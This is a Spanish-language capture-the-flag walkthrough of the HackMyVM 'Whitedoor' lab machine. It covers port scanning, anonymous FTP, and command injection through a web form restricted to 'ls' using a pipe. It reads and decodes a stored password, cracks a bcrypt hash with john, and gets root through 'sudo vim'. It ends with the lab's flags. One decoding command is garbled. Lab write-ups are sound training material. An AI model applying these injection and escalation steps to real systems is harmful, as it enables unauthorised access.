---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Whitedoor HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 07:48 EDT
Nmap scan report for 192.168.5.39
Host is up (0.00085s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              13 Nov 16  2023 README.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.5.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:85:a2:89:a9:c5:45:d0:1f:ed:3f:45:87:9d:71:a6 (ECDSA)
|_  256 07:e8:c5:28:5e:84:a7:b6:bb:d5:1d:2f:d8:92:6b:a6 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Home
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:CE:C3:05 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
```

Veremos que hay varios puertos entre ellos, el puerto `80` y el `FTP` que por lo que vemos se puede conectar de forma anonima, por lo que vamos a probar a leer ese archivo que nos esta detectando a ver que contiene.

```shell
ftp anonymous@<IP>
```

Dejamos la contraseña vacia y veremos que estamos dentro, vamos a descargarnos el archivo `.txt`.

```shell
get README.txt
```

Ahora si lo leemos veremos lo siguiente:

```
¡Good luck!
```

Nada interesante, por lo que vamos a investigar el puerto `80`, que si entramos veremos que esta alojando una pagina web en la que tiene un cuadro de texto para meter palabras o texto, pero si metemos cualquier palabra nos pondra lo siguiente:

```
Permission denied. Only the 'ls' command is allowed.
```

Vamos a probar a meter el `ls` a ver que pasa:

```
blackdoor.webp
blackindex.php
index.php
whitedoor.jpg
```

Veremos que te lista cosas interesantes, pero vamos a probar a ver que esta haciendo la peticion por dentro con `BurpSuite`, abriremos `BurpSuite` capturaremos la peticion del `ls` y vamos a investigar como responde, etc...

## Escalate user whiteshell

Pero no veremos nada interesante, vamos a pronar a intentar concatenar comandos con un `pipeline` (`|`), a ver si nos permite ejecutar comandos que no sean solo el `ls`.

```shell
ls | whoami
```

Info:

```
www-data
```

Vemos que efectivamente esta funcionando, por lo que vamos a investigar realizando este `bypass` de restriccion de comandos.

Indiagando un poco en el sistema, veremos el siguiente archivo ejecutando lo siguiente:

```shell
ls | ls -la /home/whiteshell/Desktop
```

Info:

```
total 12
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16  2023 .
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17  2023 ..
-r--r--r-- 1 whiteshell whiteshell   56 Nov 16  2023 .my_secret_password.txt
```

Vamos a ver que contiene con este otro comando.

```shell
ls | cat /home/whiteshell/Desktop/.my_secret_password.txt
```

Info:

```
whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
```

Vemos lo que parece unas credenciales, pero la contraseña esta codificada en `Base64`, por lo que vamos a intentar decodificarla de esta forma.

```shell
echo "VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K" | echo "VGgxc0lzVGgzUDRzU3dPckRibGFjNQo=" | base64 -d
```

Info:

```
Th1sIsTh3P4sSwOrDblac5
```

### SSH

Veremos que hemos obtenido la contraseña original, por lo que vamos a probarlo mediante el `SSH` de esta forma.

```shell
ssh whiteshell@<IP>
```

Metemos como contraseña `Th1sIsTh3P4sSwOrDblac5` y veremos que estaremos dentro.

## Escalate user Gonzalo

Si nos vamos a la `/home` del usuario `Gonzalo` veremos que en la carpeta `Desktop/` esta el mismo archivo que nosotros teniamos en nuestra carpeta de `whiteshell`, pero si lo leemos veremos lo siguiente:

```shell
cat /home/Gonzalo/.my_secret_hash
```

Info:

```
$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
```

Por lo que vemos es el `hash` de la contraseña del usuario `gonzalo` por lo que vamos a intentar crackearla con `john`.

```shell
john --format=crypt --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwertyuiop       (?)     
1g 0:00:00:04 DONE (2025-06-15 08:04) 0.2457g/s 94.34p/s 94.34c/s 94.34C/s adidas..michael1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado y habremos obtenido la contraseña del usuario `gonzalo` vamos a probarla con dicho usuario.

```shell
su Gonzalo
```

Metemos como contraseña `qwertyuiop` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
Y0uG3tTh3Us3RFl4g!!
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for Gonzalo on whitedoor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User Gonzalo may run the following commands on whitedoor:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

Veremos que podemos ejecutar el binario `vim` como el usuario `root`, por lo que podremos hacer lo siguiente:

```shell
sudo vim -c ':!/bin/bash'
```

Info:

```
root@whitedoor:/home/Gonzalo# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
Y0uAr3Th3B3sTy0Ug3Tr0oT!!
```
